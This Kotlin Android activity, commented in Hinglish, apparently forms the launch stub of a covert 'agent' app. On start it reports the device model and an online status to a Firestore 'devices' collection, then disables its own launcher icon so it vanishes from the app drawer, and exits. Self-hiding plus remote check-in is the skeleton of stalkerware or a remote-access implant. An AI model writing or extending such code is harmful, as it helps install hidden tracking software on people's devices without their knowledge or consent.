package com.agent

import android.app.Activity
import android.os.Bundle
import android.os.Build
import com.google.firebase.firestore.FirebaseFirestore
import android.content.ComponentName
import android.content.pm.PackageManager

class MainActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // 1. Firestore me data bhejo
        val db = FirebaseFirestore.getInstance()
        val data = hashMapOf(
            "model" to Build.MODEL,
            "online" to true,
            "last_seen" to com.google.firebase.firestore.FieldValue.serverTimestamp()
        )
        
        // Safe ID banao (FINGERPRINT me slash hota hai jo Firestore kharab karta hai)
        val safeId = Build.MODEL.replace(" ", "_") + "_" + System.currentTimeMillis()
        db.collection("devices").document(safeId).set(data)

        // 2. Icon hide karo (App drawer se gayab)
        val pkg = packageManager
        val component = ComponentName(this, MainActivity::class.java)
        pkg.setComponentEnabledSetting(component, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)

        // 3. App band ho jaye
        finish() 
    }
}
